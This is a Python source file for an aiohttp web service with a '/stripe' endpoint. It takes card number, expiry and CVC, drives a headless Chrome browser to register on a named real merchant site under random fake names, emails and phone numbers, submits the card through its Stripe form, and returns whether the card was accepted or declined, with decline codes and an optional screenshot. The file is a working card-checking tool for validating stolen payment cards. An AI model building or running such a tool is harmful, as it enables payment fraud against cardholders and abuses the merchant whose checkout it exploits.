from time import time
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
import string
import random
import logging
from aiohttp.web import RouteTableDef, json_response
from aiohttp.web import Application, run_app, FileResponse
from selenium import webdriver
import os
import base64

routes = RouteTableDef()


chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--log-level=3")

browser = webdriver.Chrome(options=chrome_options)


async def pay(cc, exp_mo, exp_yr, cvc):
    browser.delete_all_cookies()
    browser.get("https://martialartsolympia.com/virtual-classes-signup")
    wait = WebDriverWait(browser, 10)
    try:
     wait.until(EC.element_to_be_clickable(
        (By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[1]")))
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[1]").send_keys(gen_random_name())
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/input[2]").send_keys(gen_random_name() + "@gmail.com")
     password = gen_random_name()
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div/div[1]/input[1]").send_keys(password)
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div/div[1]/input[2]").send_keys(password)
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[2]/div[2]/input").send_keys(gen_random_us_phone())
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[4]/section/div[2]/label[2]").click()
     browser.switch_to.frame(browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div/div[4]/section/div[2]/label[2]/div/label/div/div/iframe"))
     browser.find_element(By.NAME, "cardnumber").send_keys(cc)
     browser.find_element(By.NAME, "exp-date").send_keys(exp_mo + "/" + exp_yr)
     browser.find_element(By.NAME, "cvc").send_keys(cvc)
     browser.switch_to.default_content()
     wait.until(EC.element_to_be_clickable((
        By.NAME, "field0")
    ))
     browser.find_element(
        By.NAME, "field0").send_keys(gen_random_name())
     browser.find_element(
        By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/a[2]").click()
     try:
        wait.until(EC.element_to_be_clickable((
            By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/div")
        ))
        box = browser.find_element(
            By.XPATH, "/html/body/div[1]/div[1]/div/div/div[2]/div/div[2]/div[2]/div/div/div/div[2]/div[5]/div/div/div[2]/div")
        if box.text == "Success!":
            return "Success!", "N/A", "N/A", browser
        if "." in box.text[:len(box.text) - 1]:
            return "declined", box.text[:box.text.find(".")], box.text[box.text.find(".") + 1:].strip(), browser
        return "declined", box.text, "N/A", browser
     except NoSuchElementException:
        browser.set_window_size(1920, 1080)
        return "error", "N/A", "N/A", browser
    except:
        return "crashed", "N/Q", "N/A", browser

def gen_random_us_phone():
    '''
    Generate a random US phone number.
    '''
    return "".join(random.choice(string.digits) for i in range(10))


def gen_random_name():
    '''
    Generate a random name.
    '''
    return "".join(random.choice(string.ascii_lowercase) for i in range(10))


@routes.post("/stripe")
@routes.get("/stripe")
async def stripe(request):
    try:
        cc = request.rel_url.query["cc"]
    except KeyError:
        return json_response({"error": "No credit card provided."})
    try:
        cc, exp_mo, exp_yr, cvc = cc.split("|") if "|" in cc else cc.split("-")
    except (ValueError, IndexError, TypeError):
        return json_response({"error": "Invalid credit card number."})
    if not cc or not exp_mo or not exp_yr or not cvc:
        return json_response({"error": "Invalid credit card provided."})
    print("[*] Stripe payment received.")
    current_time = time()
    stat, dcode, message, browse = await pay(cc, exp_mo, exp_yr, cvc)
    try:
        img = request.rel_url.query["img"]
        if img == "true":
            img = True
        else:
            img = False
    except KeyError:
        img = False
    if img:
        img = browse.get_screenshot_as_png()
        return json_response({"status": stat, "dcode": dcode, "message": message, "time": time() - current_time, "img": base64.b64encode(img).decode()})
    return json_response({"status": stat, "dcode": dcode, "message": message, "time": time() - current_time})

PORT = int(os.environ.get("PORT", 80))
app = Application()
app.add_routes(routes)
logging.info("starting server on port", PORT)
run_app(app, port=PORT)
